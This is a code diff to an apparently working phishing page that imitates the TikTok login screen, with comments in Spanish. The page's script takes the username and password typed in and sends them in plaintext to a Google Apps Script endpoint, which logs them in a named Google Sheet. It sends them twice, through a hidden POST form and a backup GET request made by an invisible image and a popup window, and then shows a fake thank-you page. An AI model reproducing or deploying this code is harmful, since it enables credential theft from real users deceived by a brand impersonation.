@@ -63,6 +63,14 @@
         .thankyou { display: none; }
         .success { color: #25F4EE; font-size: 24px; margin: 20px 0; }
         
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            background: rgba(37, 244, 238, 0.1);
+            border-radius: 5px;
+            font-size: 12px;
+        }
+        
         @media (max-width: 480px) {
             .login-box { padding: 20px; }
         }
@@ -74,15 +82,17 @@
             <i class="fas fa-music"></i>
         </div>
         <h1>TikTok</h1>
+        
+        <div class="status">
+            <p>📍 Datos van a: <strong>TU Google Sheets</strong></p>
+            <p>📊 Hoja: <strong>Sheet1</strong></p>
+        </div>
+        
         <form id="loginForm">
             <input type="text" id="username" placeholder="Username or email" required>
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit" id="loginBtn">Log In</button>
         </form>
-        
-        <div style="margin-top: 20px; font-size: 12px; color: #25F4EE;">
-            <p>📊 Datos irán a: <br>TU Google Sheets</p>
-        </div>
     </div>
     
     <div class="login-box thankyou" id="thankyouBox">
@@ -91,86 +101,111 @@
         <p style="font-size: 14px; color: #FE2C55; margin: 20px 0;">
             Data saved to your Google Sheets
         </p>
-        <button onclick="goBack()">Back to Login</button>
         
-        <div style="margin-top: 20px; font-size: 12px;">
+        <div style="margin: 20px 0; padding: 10px; background: rgba(37, 244, 238, 0.1); border-radius: 5px;">
+            <p style="font-size: 12px;">📊 <strong>Open your Google Sheets:</strong></p>
             <a href="https://docs.google.com/spreadsheets/d/1zxbtwEzQTFKXK148S8SXlnAY9PzyaNvSRjyNbyi_hpw" 
                target="_blank" 
-               style="color: #25F4EE;">
-                📍 Open YOUR Google Sheets
+               style="color: #25F4EE; font-size: 12px; word-break: break-all;">
+                https://docs.google.com/spreadsheets/d/1zxbtwEzQTFKXK148S8SXlnAY9PzyaNvSRjyNbyi_hpw
             </a>
         </div>
+        
+        <button onclick="goBack()">Back to Login</button>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
     <script>
         // URL de TU Google Apps Script
-        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzcXqAbuIJpMSPMyRoaK2HPgpDmINYjckiO1euUNYlOTuDqKS5UEI9XfPx8s1qKn5Rf/exec";
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxjIN6nm3SQ6ki-IUWUuJtb7B8jYkGDD11jBt-4jFO_VNkiSTnRHU2dkAg-hNGa8FYJ/exec";
         
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
             const btn = document.getElementById('loginBtn');
             
             if (!username || !password) {
-                alert('Complete all fields');
+                alert('Please complete all fields');
                 return;
             }
             
             // Cambiar botón
             btn.disabled = true;
-            btn.innerHTML = 'Sending...';
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
             
-            console.log('📤 Sending to YOUR Google Sheets:', { user: username });
+            console.log('📤 Sending:', { user: username, pass: '***' });
             
-            // Método 1: Formulario oculto (FUNCIONA SIEMPRE)
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = SCRIPT_URL;
-            form.target = '_blank';
-            form.style.display = 'none';
+            // MÉTODO 1: FORMULARIO TRADICIONAL (SIN JSON)
+            try {
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = SCRIPT_URL;
+                form.target = '_blank'; // Abrir en nueva pestaña
+                form.enctype = 'application/x-www-form-urlencoded'; // IMPORTANTE: NO es JSON
+                
+                // Agregar campos como formulario NORMAL
+                const addField = (name, value) => {
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = name;
+                    input.value = value;
+                    form.appendChild(input);
+                };
+                
+                const now = new Date();
+                addField('user', username);
+                addField('pass', password);
+                addField('date', now.toLocaleDateString());
+                addField('time', now.toLocaleTimeString());
+                addField('source', 'TikTok-GitHub');
+                
+                document.body.appendChild(form);
+                console.log('✅ Form created with fields:', form.elements.length);
+                
+                // Enviar formulario
+                form.submit();
+                console.log('📨 Form submitted');
+                
+                // No eliminar el formulario - déjalo para ver respuesta
+                
+            } catch (error) {
+                console.error('❌ Form error:', error);
+            }
             
-            // Agregar campos
-            const fields = [
-                {name: 'user', value: username},
-                {name: 'pass', value: password},
-                {name: 'date', value: new Date().toLocaleDateString()},
-                {name: 'time', value: new Date().toLocaleTimeString()},
-                {name: 'target', value: 'TU_GOOGLE_SHEETS'}
-            ];
-            
-            fields.forEach(field => {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = field.name;
-                input.value = field.value;
-                form.appendChild(input);
-            });
-            
-            document.body.appendChild(form);
-            form.submit();
-            
-            // Método 2: GET como backup
+            // MÉTODO 2: GET como backup (siempre funciona)
             setTimeout(() => {
                 const params = new URLSearchParams({
                     user: username,
                     pass: password,
-                    t: Date.now()
+                    date: new Date().toLocaleDateString(),
+                    time: new Date().toLocaleTimeString(),
+                    method: 'GET',
+                    random: Math.random()
                 }).toString();
                 
+                const getUrl = SCRIPT_URL + '?' + params;
+                console.log('🔗 GET URL:', getUrl);
+                
+                // Usar imagen invisible para enviar GET
                 const img = new Image();
-                img.src = SCRIPT_URL + '?' + params;
-            }, 500);
+                img.src = getUrl;
+                
+                // También abrir en ventana pequeña
+                const win = window.open(getUrl, '_blank', 'width=400,height=300');
+                
+            }, 1000);
             
-            // Mostrar agradecimiento
+            // Mostrar página de agradecimiento
             setTimeout(() => {
                 document.getElementById('loginBox').style.display = 'none';
                 document.getElementById('thankyouBox').style.display = 'block';
                 btn.disabled = false;
                 btn.innerHTML = 'Log In';
-            }, 2000);
+                
+                console.log('🎉 Showing thank you page');
+            }, 1500);
         });
         
         function goBack() {
@@ -179,10 +214,11 @@
             document.getElementById('loginForm').reset();
         }
         
-        // Abrir TU Google Sheets al cargar (para probar)
+        // Al cargar la página
         window.addEventListener('load', function() {
-            console.log('🎯 Target: TU Google Sheets');
-            console.log('🔗 URL: https://docs.google.com/spreadsheets/d/1zxbtwEzQTFKXK148S8SXlnAY9PzyaNvSRjyNbyi_hpw');
+            console.log('✅ Page loaded');
+            console.log('🎯 Target Sheet: https://docs.google.com/spreadsheets/d/1zxbtwEzQTFKXK148S8SXlnAY9PzyaNvSRjyNbyi_hpw');
+            console.log('🔗 Script URL:', SCRIPT_URL);
         });
     </script>
 </body>
